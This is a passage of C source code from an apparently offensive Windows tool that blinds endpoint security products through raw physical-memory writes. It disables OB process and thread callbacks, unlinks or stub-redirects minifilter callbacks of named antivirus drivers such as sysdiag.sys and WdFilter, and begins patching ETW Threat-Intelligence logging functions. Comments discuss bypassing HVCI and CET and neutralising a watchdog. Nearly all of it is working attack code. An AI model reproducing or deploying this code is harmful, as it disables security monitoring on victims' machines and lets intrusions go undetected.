    uint64_t ppa=cpa+off+0x08;
    for(int i=0;i<g_ob_n;i++) if(g_ob[i].preop_pa==ppa) return 0;
    if(g_ob_n>=OB_MAX) return 0;
    ObEntry *e=&g_ob[g_ob_n++];
    e->preop_pa=ppa; e->postop_pa=ppa+8;
    e->preop_va=preop; e->postop_va=*(uint64_t*)(g_chunk+off+0x10);
    e->objtype_va=target_ot; e->enabled_pa=cpa+off-0x0C;
    strncpy(e->drv,"sysdiag.sys",63); e->drv[63]='\0'; e->zeroed=0;
    printf("    [OB-ot] sysdiag trampoline (OT scan) preop=0x%llX fl=0x%llX bl=0x%llX\n",
           (unsigned long long)preop,(unsigned long long)fl,(unsigned long long)bl);
    return 1;
}
/* Tier-2 raw: OT exact-match + trampoline preop only — no Flink/Blink requirement.
 * Fires when the entry's list pointers are non-canonical (sysdiag head-of-list edge case).
 * Prints full 64-byte context for offline diagnosis regardless of accept/reject. */
static int ob_try_by_ot_raw(uint64_t cpa, uint64_t off, uint64_t csz, uint64_t target_ot)
{
    if(off<0x20||off+0x18>csz) return 0;
    if(*(uint64_t*)(g_chunk+off) != target_ot) return 0;
    uint64_t preop=*(uint64_t*)(g_chunk+off+0x08);
    if(!preop||(preop>>48)!=0xFFFFULL) return 0;
    if(preop == target_ot) return 0;
    if(preop & 0xF) return 0;
    if(preop == g_pstype_va[0] || preop == g_pstype_va[1]) return 0;
    uint64_t pr=0;
    if(va_to_driver_ex(preop,&pr) && pr && pr<MAX_SANE_RVA) return 0;
    /* Print raw context for diagnosis */
    printf("    [OB-raw] OT hit PA=0x%llX off=0x%llX preop=0x%llX\n",
           (unsigned long long)(cpa+off),(unsigned long long)off,(unsigned long long)preop);
    if(off>=0x20){
        uint64_t *ctx=(uint64_t*)(g_chunk+off-0x20);
        printf("           -0x20:%016llX -0x18:%016llX -0x10:%016llX -0x08:%016llX\n",
               (unsigned long long)ctx[0],(unsigned long long)ctx[1],
               (unsigned long long)ctx[2],(unsigned long long)ctx[3]);
    }
    printf("           +0x00:%016llX +0x08:%016llX +0x10:%016llX\n",
           (unsigned long long)*(uint64_t*)(g_chunk+off),
           (unsigned long long)*(uint64_t*)(g_chunk+off+8),
           (unsigned long long)*(uint64_t*)(g_chunk+off+16));
    uint64_t ppa=cpa+off+0x08;
    for(int i=0;i<g_ob_n;i++) if(g_ob[i].preop_pa==ppa) return 0;
    if(g_ob_n>=OB_MAX) return 0;
    ObEntry *e=&g_ob[g_ob_n++];
    e->preop_pa=ppa; e->postop_pa=ppa+8;
    e->preop_va=preop; e->postop_va=*(uint64_t*)(g_chunk+off+0x10);
    e->objtype_va=target_ot; e->enabled_pa=cpa+off-0x0C;
    strncpy(e->drv,"sysdiag.sys",63); e->drv[63]='\0'; e->zeroed=0;
    printf("    [OB-raw] accepted → preop_pa=0x%llX\n",(unsigned long long)ppa);
    return 1;
}
static void ob_scan(void){} /* replaced by combined_pool_scan (defined after all modules) */

/* Walk _OBJECT_TYPE.CallbackList directly (PsProcessType + PsThreadType exports)
 * to zero any sysdiag.sys OB callback.  Pool-scan misses entries whose PreOp VA
 * is a pool trampoline (not inside any loaded driver image); this walk never misses
 * them because it follows the kernel's own linked list. */
static int ob_zero_via_typelist(void)
{
    /* Requires: sysdiag watchdog killed + ntoskrnl PE loaded + sysdiag device open.
     * Uses sd_read_kva / sd_write_kva for all pool-VA accesses so va_to_pa is NOT needed.
     * ntoskrnl exports resolved via g_nt_pa+rva (large-page mapped, no page walk). */
    if(!g_sysdiag_wd_killed || !g_sd_base || !g_sd_size) return 0;
    if(!g_nt_pa || !g_nt_pe || !g_nt_pe_sz || !g_nt_va) return 0;
    if(!sd_open()) return 0;

    static const char *PSTYPE_EXPORTS[] = { "PsProcessType", "PsThreadType", NULL };
    int total = 0;

    for(int ti = 0; PSTYPE_EXPORTS[ti]; ti++){
        uint32_t rva = pe_export_rva(g_nt_pe, g_nt_pe_sz, PSTYPE_EXPORTS[ti]);
        if(!rva){ printf("    [OB-tl] %s not exported\n", PSTYPE_EXPORTS[ti]); continue; }

        /* PsProcessType / PsThreadType: POBJECT_TYPE* stored in ntoskrnl .data.
         * Read via sysdiag kva-read (no va_to_pa needed). */
        uint64_t obj_type_va = 0;
        if(!sd_read_kva(g_nt_va + rva, &obj_type_va, 8) || (obj_type_va>>48)!=0xFFFF){
            printf("    [OB-tl] %s sd_read failed or bad VA\n", PSTYPE_EXPORTS[ti]);
            continue;
        }

        /* _OBJECT_TYPE.CallbackList at +0xC8 — read Flink (head of circular list) */
        uint64_t cb_head_va = obj_type_va + 0xC8;
        uint64_t flink = 0;
        if(!sd_read_kva(cb_head_va, &flink, 8) || !flink){
            printf("    [OB-tl] %s CallbackList.Flink read failed\n", PSTYPE_EXPORTS[ti]);
            continue;
        }

        printf("    [OB-tl] %s _OBJECT_TYPE=0x%llX CallbackList.Flink=0x%llX\n",
               PSTYPE_EXPORTS[ti], (unsigned long long)obj_type_va, (unsigned long long)flink);

        uint64_t curr = flink;
        int zeroed = 0;
        for(int iter = 0; iter < 128 && curr && curr != cb_head_va; iter++){
            /* OB_CALLBACK_ENTRY layout: +0x00 LIST_ENTRY, +0x14 Enabled(BOOL),
             * +0x28 PreOperation, +0x30 PostOperation */
            uint64_t preop_va = 0;
            sd_read_kva(curr + 0x28, &preop_va, 8);
            if(preop_va >= g_sd_base && preop_va < g_sd_base + g_sd_size){
                uint64_t z8 = 0; uint32_t z4 = 0;
                sd_write_kva(curr + 0x28, &z8, 8);  /* null PreOperation */
                sd_write_kva(curr + 0x14, &z4, 4);  /* Enabled = 0 */
                printf("    [OB-tl] zeroed sysdiag %s entry@0x%llX preop=0x%llX\n",
                       PSTYPE_EXPORTS[ti], (unsigned long long)curr,
                       (unsigned long long)preop_va);
                zeroed++;
            }
            uint64_t next = 0;
            if(!sd_read_kva(curr, &next, 8) || !next || (next>>48)!=0xFFFF) break;
            curr = next;
        }
        total += zeroed;
        if(!zeroed) printf("    [OB-tl] %s: no sysdiag entries in list\n", PSTYPE_EXPORTS[ti]);
    }
    return total;
}

static int ob_apply_edr(void)
{
    /* Dump all OB entries for diagnosis */
    printf("    [OB] all entries (%d total):\n", g_ob_n);
    for(int i=0;i<g_ob_n;i++){
        ObEntry *e=&g_ob[i];
        printf("      [%d] drv=%-24s preop_va=0x%llX\n",
               i, e->drv[0]?e->drv:"(no name)",
               (unsigned long long)e->preop_va);
    }

    int ok=0;
    for(int i=0;i<g_ob_n;i++){
        ObEntry *e=&g_ob[i];
        /* sysdiag OB: match by name OR by preop_va falling in sysdiag image range.
         * The trampoline-through-pool case gives va_to_driver_ex=NULL → drv="" → name miss.
         * VA-range check catches both. */
        int sd_ob = 0;
        if(g_sysdiag_wd_killed){
            if(_stricmp(e->drv,"sysdiag.sys")==0) sd_ob=1;
            if(g_sd_base && e->preop_va>=g_sd_base &&
               e->preop_va<g_sd_base+g_sd_size) sd_ob=1;
        }
        if(!is_edr_target(e->drv) && !sd_ob) continue;
        if(sd_ob) printf("    [OB] zeroing sysdiag.sys entry preop_va=0x%llX\n",(unsigned long long)e->preop_va);
        /* EDRSandblast technique 1: clear the Enabled flag in OB_CALLBACK_ENTRY.
         * Fallback to zeroing PreOperation pointer if enabled_pa is unusable. */
        if(e->enabled_pa && pa_in_range(e->enabled_pa,4)){
            phys_read(e->enabled_pa,e->orig_en,4);
            uint32_t z=0;
            if(phys_write(e->enabled_pa,&z,4)){e->zeroed=1;ok++;
                if(sd_ob) printf("    [OB] sysdiag Enabled cleared OK\n");}
        } else {
            uint64_t z=0;
            phys_read(e->preop_pa,e->orig_pre,8);
            if(phys_write(e->preop_pa,&z,8)){e->zeroed=1;ok++;
                if(sd_ob) printf("    [OB] sysdiag preop zeroed OK\n");}
        }
    }
    return ok;
}
static void ob_restore(void)
{
    for(int i=0;i<g_ob_n;i++){
        ObEntry *e=&g_ob[i]; if(!e->zeroed) continue;
        if(e->enabled_pa && pa_in_range(e->enabled_pa,4)){
            uint32_t cur=0;
            if(phys_read(e->enabled_pa,&cur,4)&&cur==0)
                phys_write(e->enabled_pa,e->orig_en,4);
        } else {
            uint64_t cur=0;
            if(phys_read(e->preop_pa,&cur,8)&&cur==0)
                phys_write(e->preop_pa,e->orig_pre,8);
        }
        e->zeroed=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §5  MODULE: FLT MINIFILTER
 * ══════════════════════════════════════════════════════════════════════ */

/* VA of a 'xor eax,eax; ret' stub inside ntoskrnl.
 * Used by Method A.6 to replace sysdiag's callback ptrs with a VALID function
 * that returns 0 (FLT_PREOP_SUCCESS_WITH_CALLBACK / FLT_POSTOP_FINISHED_PROCESSING).
 * Writing NULL (0) causes BSOD: FltMgr does NOT null-check dispatch ptrs before calling. */
static uint64_t g_flt_stub_va = 0;


/* Scan ntoskrnl for a 'xor eax,eax; ret' stub that is safe to use as a CET indirect-call target.
 * On Win11 with IBT/CET every valid call target starts with endbr64 (F3 0F 1E FA).
 * Searches for endbr64+xor eax,eax+ret first (returns VA of endbr64 = CET-valid).
 * Falls back to plain 31/33 C0 C3 for non-CET systems.
 * If disk PE scan fails, scans physical ntoskrnl image (nt_pa must be non-zero). */
static uint64_t flt_find_stub_va(const uint8_t *pe_buf, DWORD pe_sz, uint64_t nt_va, uint64_t nt_pa)
{
    /* CET-safe: endbr64 + xor eax,eax + ret (two encodings) */
    static const uint8_t E1[7]={0xF3,0x0F,0x1E,0xFA,0x31,0xC0,0xC3};
    static const uint8_t E2[7]={0xF3,0x0F,0x1E,0xFA,0x33,0xC0,0xC3};
    /* Non-CET fallback */
    static const uint8_t P1[3]={0x31,0xC0,0xC3};
    static const uint8_t P2[3]={0x33,0xC0,0xC3};

    if(pe_sz>=0x40){
        uint32_t pe_off=*(uint32_t*)(pe_buf+0x3C);
        if(pe_off+0x18<=(uint32_t)pe_sz){
            uint16_t nsec=*(uint16_t*)(pe_buf+pe_off+0x06);
            uint16_t oph =*(uint16_t*)(pe_buf+pe_off+0x14);
            uint32_t sec0=pe_off+0x18+(uint32_t)oph;
            /* First pass: endbr64 variants (CET-safe) */
            uint32_t s0=sec0;
            for(uint16_t s=0;s<nsec&&s0+0x28<=(uint32_t)pe_sz;s++,s0+=0x28){
                uint32_t vaddr =*(uint32_t*)(pe_buf+s0+0x0C);
                uint32_t rawoff=*(uint32_t*)(pe_buf+s0+0x14);
                uint32_t rawsz =*(uint32_t*)(pe_buf+s0+0x10);
                uint32_t chars =*(uint32_t*)(pe_buf+s0+0x24);
                if(!(chars&0x20000000)) continue;
                if(!rawoff||!rawsz||rawoff>=(uint32_t)pe_sz) continue;
                if(rawoff+rawsz>(uint32_t)pe_sz) rawsz=(uint32_t)pe_sz-rawoff;
                for(uint32_t i=0;i+7<=rawsz;i++){
                    const uint8_t *b=pe_buf+rawoff+i;
                    if(memcmp(b,E1,7)==0||memcmp(b,E2,7)==0)
                        return nt_va+(uint64_t)vaddr+(uint64_t)i;
                }
            }
            /* Second pass: plain xor eax,eax;ret (non-CET) */
            s0=sec0;
            for(uint16_t s=0;s<nsec&&s0+0x28<=(uint32_t)pe_sz;s++,s0+=0x28){
                uint32_t vaddr =*(uint32_t*)(pe_buf+s0+0x0C);
                uint32_t rawoff=*(uint32_t*)(pe_buf+s0+0x14);
                uint32_t rawsz =*(uint32_t*)(pe_buf+s0+0x10);
                uint32_t chars =*(uint32_t*)(pe_buf+s0+0x24);
                if(!(chars&0x20000000)) continue;
                if(!rawoff||!rawsz||rawoff>=(uint32_t)pe_sz) continue;
                if(rawoff+rawsz>(uint32_t)pe_sz) rawsz=(uint32_t)pe_sz-rawoff;
                for(uint32_t i=0;i+3<=rawsz;i++){
                    const uint8_t *b=pe_buf+rawoff+i;
                    if(memcmp(b,P1,3)==0||memcmp(b,P2,3)==0)
                        return nt_va+(uint64_t)vaddr+(uint64_t)i;
                }
            }
        }
    }

    /* Physical fallback: scan loaded ntoskrnl in RAM when disk scan fails.
     * ntoskrnl is large-page mapped at boot, physically contiguous from nt_pa.
     * VA = nt_va + (match_pa - nt_pa) = nt_va + offset. */
    if(nt_pa && pe_sz>0){
#define STUB_CHUNK 65536u
        static uint8_t pbuf[STUB_CHUNK+16];
        uint32_t nt_sz=(uint32_t)pe_sz;
        /* Pass 1: endbr64 variants */
        for(uint32_t off=0;off<nt_sz;off+=STUB_CHUNK){
            uint32_t csz=nt_sz-off; if(csz>STUB_CHUNK+16) csz=STUB_CHUNK+16;
            if(!phys_read(nt_pa+off,pbuf,csz)) continue;
            for(uint32_t i=0;i+7<=csz;i++)
                if(memcmp(pbuf+i,E1,7)==0||memcmp(pbuf+i,E2,7)==0)
                    return nt_va+(uint64_t)off+(uint64_t)i;
        }
        /* Pass 2: plain patterns */
        for(uint32_t off=0;off<nt_sz;off+=STUB_CHUNK){
            uint32_t csz=nt_sz-off; if(csz>STUB_CHUNK+16) csz=STUB_CHUNK+16;
            if(!phys_read(nt_pa+off,pbuf,csz)) continue;
            for(uint32_t i=0;i+3<=csz;i++)
                if(memcmp(pbuf+i,P1,3)==0||memcmp(pbuf+i,P2,3)==0)
                    return nt_va+(uint64_t)off+(uint64_t)i;
        }
#undef STUB_CHUNK
    }
    return 0;
}

#define FLT_MAX_RAW 16384
#define FLT_MAX_GRP 64
#define FLT_MAX_NODES 96
#define FLT_MIN_VOTES 5

typedef struct {
    uint64_t preop_pa,postop_pa,preop,postop,filter;
    uint8_t  anchor;
    uint8_t  raw64[64];         /* raw struct bytes from start (raw64[0..7]=Flink, [8..15]=Blink) */
    uint8_t  _p[7];
    /* List-unlink data — populated in flt_apply_edr when g_kernel_cr3 is available */
    uint64_t flink_va, blink_va;     /* LIST_ENTRY Flink / Blink values read from raw64 */
    uint64_t ulpf_pa, ulnb_pa;      /* PA of PREV.Flink and NEXT.Blink for restore */
    uint64_t ulpf_orig, ulnb_orig;  /* original values saved before unlink */
    int      unlinked;
    int      zeroed;                 /* A.6: preop/postop ptrs zeroed in FltMgr pool */
} FltNode;
typedef struct {
    uint64_t filter_va; char driver[64]; DrvClass cls;
    int n; int patched; FltNode nodes[FLT_MAX_NODES];
} FltGroup;

static FltNode   *g_flt_raw=NULL; static int g_flt_n_raw=0;
static FltGroup   g_flt_grp[FLT_MAX_GRP]; static int g_flt_n_grp=0;

#define FLT_PFMAX 256
typedef struct{uint64_t func_va,func_pa;uint8_t orig[3];char drv[64];}FltPFunc;
static FltPFunc g_flt_pf[FLT_PFMAX]; static int g_flt_n_pf=0;

static int flt_try(uint64_t cpa, uint64_t off, uint8_t anc, uint64_t csz)
{
    if(off<(uint64_t)anc||off+0x10>csz) return 0;
    uint64_t preop=*(uint64_t*)(g_chunk+off); uint64_t pr=0;
    const char *pd=va_to_driver_ex(preop,&pr); if(!pd||!pr||pr>=MAX_SANE_RVA) return 0;
    uint64_t flink=*(uint64_t*)(g_chunk+off-anc),blink=*(uint64_t*)(g_chunk+off-anc+8);
    uint64_t filter=*(uint64_t*)(g_chunk+off-anc+0x10);
    uint64_t postop=*(uint64_t*)(g_chunk+off+8);
    if(flink<0xFFFF800000000000ULL||blink<0xFFFF800000000000ULL||filter<0xFFFF800000000000ULL) return 0;
    if(postop&&postop<0xFFFF800000000000ULL) return 0;
    if(filter&7||preop&3) return 0;
    if((filter>>32)>=0xFFFFF800ULL&&(filter>>32)<=0xFFFFFBFFULL) return 0;
    if(va_to_driver(filter)) return 0;
    if(postop){uint64_t qr=0;const char *qd=va_to_driver_ex(postop,&qr);if(!qd||strcmp(qd,pd)||!qr||qr>=MAX_SANE_RVA) return 0;}
    if(postop&&preop==postop) return 0;
    uint64_t pa=cpa+off;
    for(int d=0;d<g_flt_n_raw;d++) if(g_flt_raw[d].preop_pa==pa) return 0;
    if(g_flt_n_raw>=FLT_MAX_RAW) return 0;
    FltNode *nd=&g_flt_raw[g_flt_n_raw++];
    nd->preop_pa=pa; nd->postop_pa=pa+8; nd->preop=preop; nd->postop=postop; nd->filter=filter; nd->anchor=anc;
    uint64_t bo=off-anc; uint32_t cap=(csz-bo>64)?64:(uint32_t)(csz-bo);
    memcpy(nd->raw64,g_chunk+bo,cap); if(cap<64) memset(nd->raw64+cap,0,64-cap);
    nd->flink_va=*(uint64_t*)nd->raw64;         /* LIST_ENTRY.Flink = NEXT node's LIST_ENTRY VA */
    nd->blink_va=*(uint64_t*)(nd->raw64+8);     /* LIST_ENTRY.Blink = PREV node's LIST_ENTRY VA */
    nd->unlinked=0;
    return 1;
}
static void flt_scan_stage1(void)
{
    g_flt_n_raw=0; uint64_t lp=0; const uint8_t ancs[3]={0x20,0x18,0x28};
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(g_flt_n_raw>=FLT_MAX_RAW) goto flt1_done;
            if(cpa-lp>=0x80000000ULL){printf("  [%5lluMB] flt=%d\r",(unsigned long long)(cpa>>20),g_flt_n_raw);fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0x28;off+0x10<=csz&&g_flt_n_raw<FLT_MAX_RAW;off+=8)
                for(int ai=0;ai<3;ai++) if(flt_try(cpa,off,ancs[ai],csz)) break;
        }
    }
flt1_done:;
}
static void flt_scan_stage2(void)
{
    typedef struct{uint64_t v;int c;}FE;
    FE *freq=(FE*)calloc(g_flt_n_raw,sizeof(FE)); if(!freq) return; int nf=0;
    for(int i=0;i<g_flt_n_raw;i++){
        int f=0;
        for(int j=0;j<nf;j++) if(freq[j].v==g_flt_raw[i].filter){freq[j].c++;f=1;break;}
        if(!f){freq[nf].v=g_flt_raw[i].filter;freq[nf].c=1;nf++;}
    }
    for(int i=1;i<nf;i++){FE k=freq[i];int j=i-1;while(j>=0&&freq[j].c<k.c){freq[j+1]=freq[j];j--;}freq[j+1]=k;}
    g_flt_n_grp=0;
    for(int j=0;j<nf&&g_flt_n_grp<FLT_MAX_GRP;j++){
        if(freq[j].c<FLT_MIN_VOTES) break;
        FltGroup *grp=&g_flt_grp[g_flt_n_grp];
        grp->filter_va=freq[j].v; grp->driver[0]='\0'; grp->n=0; grp->patched=0;
        /* majority vote for driver name */
        typedef struct{const char*n;int c;}DV; DV votes[32]; int nv=0;
        for(int i=0;i<g_flt_n_raw;i++){
            if(g_flt_raw[i].filter!=freq[j].v) continue;
            const char *dn=va_to_driver(g_flt_raw[i].preop); if(!dn) continue;
            int f=0; for(int k=0;k<nv;k++) if(strcmp(votes[k].n,dn)==0){votes[k].c++;f=1;break;}
            if(!f&&nv<32){votes[nv].n=dn;votes[nv].c=1;nv++;}
        }
        if(nv>0){int best=0;for(int k=1;k<nv;k++) if(votes[k].c>votes[best].c) best=k;strncpy(grp->driver,votes[best].n,63);grp->driver[63]='\0';}
        for(int i=0;i<g_flt_n_raw&&grp->n<FLT_MAX_NODES;i++){
            if(g_flt_raw[i].filter!=freq[j].v) continue;
            const char *dn=va_to_driver(g_flt_raw[i].preop);
            if(!dn||strcmp(dn,grp->driver)) continue;
            grp->nodes[grp->n++]=g_flt_raw[i];
        }
        if(grp->n<FLT_MIN_VOTES){grp->driver[0]='\0';grp->n=0;continue;}
        grp->cls=classify_driver(grp->driver[0]?grp->driver:"");
        g_flt_n_grp++;
    }
    free(freq);
}
static int flt_patch_func(uint64_t func_va, uint64_t drv_pa, uint64_t drv_va, const char *name)
{
    if(!drv_pa||g_flt_n_pf>=FLT_PFMAX) return 0;
    for(int i=0;i<g_flt_n_pf;i++) if(g_flt_pf[i].func_va==func_va) return 0; /* already patched */
    uint32_t rva=(uint32_t)(func_va-drv_va); uint64_t fpa=drv_pa+rva;
    if(!pa_in_range(fpa,3)) return 0;
    FltPFunc *pf=&g_flt_pf[g_flt_n_pf];
    if(!phys_read(fpa,pf->orig,3)) return 0;
    if(pf->orig[0]==0xC3) return 0;
    if(!phys_write(fpa,PATCH3,3)) return 0;
    pf->func_va=func_va; pf->func_pa=fpa; strncpy(pf->drv,name,63); pf->drv[63]='\0'; g_flt_n_pf++;
    return 1;
}
static int flt_apply_edr(void)
{
    int total=0;
    /* Driver dedup: skip groups for drivers already patched by an earlier group */
    char done[FLT_MAX_GRP][64]; int ndone=0;

    for(int gi=0;gi<g_flt_n_grp;gi++){
        FltGroup *grp=&g_flt_grp[gi];
        /* sysdiag.sys is Huorong's main AV engine but shares its name with a Windows
         * system diagnostic component listed in SYS[] whitelist → classify_driver()
         * returns DRV_SYSTEM → cls check below would skip it. Override with is_sysdiag
         * so Huorong's sysdiag.sys gets processed even when cls==DRV_SYSTEM. */
        int is_sysdiag = (_stricmp(grp->driver,"sysdiag.sys")==0);
        if(grp->cls!=DRV_OTHER && !is_sysdiag) continue;
        if(!is_edr_target(grp->driver) && !is_sysdiag) continue;

        /* If same driver was fully processed by an earlier group, just mark patched */
        int already=0;
        for(int k=0;k<ndone;k++) if(_stricmp(done[k],grp->driver)==0){already=1;break;}
        if(already){grp->patched=1;continue;}

        /* Collect unique PreOp VAs only.
         * Collect both PreOp and PostOp: WdFilter scans EICAR content in PostOp
         * IRP_MJ_CLEANUP (after file closed), not in PreOp. Must patch both. */
        uint64_t uniq[FLT_MAX_NODES*2]; int nu=0;
        for(int i=0;i<grp->n;i++){
            /* PreOp */
            {int f=0;for(int j=0;j<nu;j++) if(uniq[j]==grp->nodes[i].preop){f=1;break;}
             if(!f&&nu<FLT_MAX_NODES*2) uniq[nu++]=grp->nodes[i].preop;}
            /* PostOp */
            if(grp->nodes[i].postop){
                int f=0;for(int j=0;j<nu;j++) if(uniq[j]==grp->nodes[i].postop){f=1;break;}
                if(!f&&nu<FLT_MAX_NODES*2) uniq[nu++]=grp->nodes[i].postop;
            }
        }
        uint64_t drv_va=0;
        for(int m=1;m<g_nmods;m++) if(_stricmp(g_mods[m].name,grp->driver)==0){drv_va=g_mods[m].base;break;}
        /* use cached PA to avoid repeated full physical scan for same driver */
        int ok=0;

        if(g_kernel_cr3 && (!is_sysdiag || g_sysdiag_wd_killed)){
            /* sysdiag: skip unless watchdog KDPC already redirected ([0/8]).
             * With watchdog neutered, Method A (LIST_ENTRY unlink) is safe:
             * the integrity check timer fires but DPC returns immediately. */
            /* ── Method A: unlink callback nodes from FltMgr's per-IRP lists ─
             * Traverses each unique node, finds PREV.Flink and NEXT.Blink via
             * page-table walk, then stitches PREV→NEXT (skipping EDR's node).
             * Filter Manager will no longer call this driver's callback for any
             * I/O on any volume. Cleaner than code-patching: no disk/memory
             * mismatch, no driver-PA scan needed.                              */
            int nuniq=0;
            uint64_t seen_preop[FLT_MAX_NODES];
            for(int j=0;j<grp->n;j++){
                FltNode *nd=&grp->nodes[j];
                if(!nd->flink_va||!nd->blink_va||nd->unlinked) continue;
                /* Dedup by preop VA so we don't double-unlink the same node */
                int dup=0;
                for(int k=0;k<nuniq;k++) if(seen_preop[k]==nd->preop){dup=1;break;}
                if(dup) continue;
                if(nuniq<FLT_MAX_NODES) seen_preop[nuniq++]=nd->preop;

                uint64_t pfpa=va_to_pa(nd->blink_va);    /* PA of PREV.Flink */
                uint64_t nbpa=va_to_pa(nd->flink_va+8);  /* PA of NEXT.Blink */
                if(!pfpa||!nbpa) continue;
                if(!phys_read(pfpa,&nd->ulpf_orig,8)) continue;
                if(!phys_read(nbpa,&nd->ulnb_orig,8)) continue;
                if(phys_write(pfpa,&nd->flink_va,8)&&phys_write(nbpa,&nd->blink_va,8)){
                    nd->ulpf_pa=pfpa; nd->ulnb_pa=nbpa; nd->unlinked=1; ok++;
                }
            }
            if(ok>0)
                printf("    %s: %d nodes unlinked from FltMgr callback lists\n",
                       grp->driver,ok);
            else
                printf("    %s: va_to_pa unavailable, falling back to code patch\n",
                       grp->driver);
        }

        if(!ok && is_sysdiag){
            if(!g_sysdiag_wd_killed)
                printf("    sysdiag.sys: watchdog active — minifilter skipped (run [0/8] first)\n");
            else
                printf("    sysdiag.sys: watchdog killed but va_to_pa unavailable — unlink failed\n");
        }
        if(!ok && !is_sysdiag){
            /* Method B.1: direct va_to_pa on each preop/postop VA.
             * Code section VAs (in driver .text) are mapped differently from pool VAs.
             * va_to_pa works for code VAs even when pool VAs fail (different PML4 entries).
             * This covers ALL callbacks found by FLT scan, including PostOp for EICAR fix. */
            if(g_kernel_cr3 && drv_va){
                int vok=0;
                for(int j=0;j<nu;j++){
                    uint64_t fn_pa=va_to_pa(uniq[j]);
                    if(!fn_pa) continue;
                    /* Sanity: PA must be in physical range and not already patched */
                    if(!pa_in_range(fn_pa,3)) continue;
                    uint8_t cur[3]={0}; phys_read(fn_pa,cur,3);
                    if(cur[0]==PATCH3[0]&&cur[1]==PATCH3[1]&&cur[2]==PATCH3[2]) {vok++;continue;}
                    if(cur[0]==0||cur[0]==0xCC) continue; /* null/breakpoint — wrong addr */
                    if(phys_write(fn_pa,PATCH3,3)) vok++;
                }
                if(vok>0){
                    printf("    %s: %d/%d fn(s) patched (va_to_pa direct)\n",grp->driver,vok,nu);
                    ok=vok;
                }
            }
            /* Method B.2: prologue scan fallback if va_to_pa gave nothing */
            if(!ok){
                uint64_t drv_pa=find_driver_pa_cached(grp->driver);
                if(!drv_pa&&nu>0&&drv_va){
                    printf("    [!] MZ scan failed, trying prologue scan...\n");
                    for(int j=0;j<nu&&!drv_pa&&j<4;j++) drv_pa=find_driver_pa_by_func(grp->driver,uniq[j],drv_va);
                    if(drv_pa&&g_pa_n<PA_CACHE_MAX){strncpy(g_pa_cache[g_pa_n].n,grp->driver,63);g_pa_cache[g_pa_n++].pa=drv_pa;}
                }
                if(drv_pa){
                    for(int j=0;j<nu;j++) if(flt_patch_func(uniq[j],drv_pa,drv_va,grp->driver)) ok++;
                    if(ok) printf("    %s: %d/%d fn(s) patched (prologue scan)\n",grp->driver,ok,nu);
                } else {
                    printf("    [!] %s: driver PA not found — skipped\n",grp->driver);
                }
            }
        }

        /* Method A.6: redirect preop/postop ptrs in FLT pool to stub (data write, HVCI-safe).
         * Pool memory is NOT protected by HVCI/EPT, so writes stick even when code patches don't.
         * Run UNCONDITIONALLY — prologue patch returns ok>0 but silently fails under HVCI
         * because code pages are EPT RX-only.  A.6 is the only reliable method under HVCI. */
        if(g_flt_stub_va){
            int a6ok=0;
            for(int j=0;j<grp->n;j++){
                FltNode *nd=&grp->nodes[j];
                if(nd->zeroed) continue;
                int node_ok=0;
                if(nd->preop_pa && nd->preop){
                    if(phys_write(nd->preop_pa,&g_flt_stub_va,8)) node_ok++;
                }
                if(nd->postop_pa && nd->postop)
                    phys_write(nd->postop_pa,&g_flt_stub_va,8);
                if(node_ok){ nd->zeroed=1; a6ok++; }
            }
            if(a6ok){
                printf("    %s: %d node(s) redirected to stub VA=0x%llX (A.6)\n",
                       grp->driver,a6ok,(unsigned long long)g_flt_stub_va);
                ok=a6ok;
            }
        }

        grp->patched=(ok>0);
        total+=ok;
        if(ndone<FLT_MAX_GRP){strncpy(done[ndone++],grp->driver,63);}
    }
    return total;
}
static void flt_restore(void)
{
    /* Restore code-patched PreOp prologues */
    for(int i=0;i<g_flt_n_pf;i++){
        FltPFunc *pf=&g_flt_pf[i]; uint8_t cur[3]={0};
        if(phys_read(pf->func_pa,cur,3)&&memcmp(cur,PATCH3,3)==0)
            phys_write(pf->func_pa,pf->orig,3);
    }
    /* Restore unlinked LIST_ENTRY nodes */
    for(int gi=0;gi<g_flt_n_grp;gi++){
        FltGroup *grp=&g_flt_grp[gi];
        for(int j=0;j<grp->n;j++){
            FltNode *nd=&grp->nodes[j];
            if(nd->unlinked){
                phys_write(nd->ulpf_pa,&nd->ulpf_orig,8); /* restore PREV.Flink */
                phys_write(nd->ulnb_pa,&nd->ulnb_orig,8); /* restore NEXT.Blink */
                nd->unlinked=0;
            }
            /* Restore A.6 stub-redirected callback pointers */
            if(nd->zeroed){
                if(nd->preop_pa  && nd->preop)  phys_write(nd->preop_pa, &nd->preop, 8);
                if(nd->postop_pa && nd->postop) phys_write(nd->postop_pa,&nd->postop,8);
                nd->zeroed=0;
            }
        }
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §6  MODULE: ETW-TI
 * ══════════════════════════════════════════════════════════════════════ */

static const uint8_t ETW_TI_GUID[16]={0x7C,0x89,0xE1,0xF4,0x5D,0xBB,0x68,0x56,0xF1,0xD8,0x04,0x0F,0x4D,0x8D,0xD3,0x44};
static const char *ETW_TI_FUNCS[]={
    "EtwTiLogReadWriteVm","EtwTiLogAllocExecVm","EtwTiLogMapExecView",
    "EtwTiLogSetContextThread","EtwTiLogSuspendResumeProcess",
    "EtwTiLogOpenProcess","EtwTiLogOpenThread",NULL
};

typedef struct{const char *name;uint64_t func_pa;uint8_t orig[3];int ok;}EtwFn;
static EtwFn   g_etw_fns[16]; static int g_etw_n_fns=0;
static uint64_t g_etw_isen_pa=0; static uint32_t g_etw_isen_orig=0;

static int etw_patch_funcs(const uint8_t *pe, size_t pe_sz, uint64_t nt_pa)
{
    int ok=0;
    for(int i=0;ETW_TI_FUNCS[i]&&g_etw_n_fns<16;i++){
        uint32_t rva=pe_export_rva(pe,pe_sz,ETW_TI_FUNCS[i]); if(!rva) continue;
        uint64_t fpa=nt_pa+rva; if(!pa_in_range(fpa,3)) continue;
        EtwFn *pf=&g_etw_fns[g_etw_n_fns]; pf->name=ETW_TI_FUNCS[i]; pf->func_pa=fpa; pf->ok=0;
        if(!phys_read(fpa,pf->orig,3)){g_etw_n_fns++;continue;}
        if(pf->orig[0]==0||pf->orig[0]==PATCH3[0]){g_etw_n_fns++;continue;}
        if(!phys_write(fpa,PATCH3,3)){g_etw_n_fns++;continue;}
